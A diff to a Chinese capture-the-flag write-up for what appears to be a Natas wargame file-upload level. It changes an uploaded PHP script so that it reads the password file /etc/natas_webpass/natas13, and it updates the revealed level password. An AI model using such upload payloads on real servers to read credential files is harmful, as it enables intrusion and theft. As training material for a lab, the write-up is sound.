@@ -206,7 +206,7 @@ $target_path = "upload/<unique random string>.<ext>"
 根据上述逻辑，可以在本地构造 php 脚本：
 ```php
 <?php
-$filename = '/etc/natas_webpass/natas12';
+$filename = '/etc/natas_webpass/natas13';
 $content = file_get_contents($filename);
 echo $content;
 ?>
@@ -216,5 +216,5 @@ echo $content;
 
 访问生成的目标路径，就可以看到密码了。
 
-密码为：`EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`
+密码为：`g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`
 
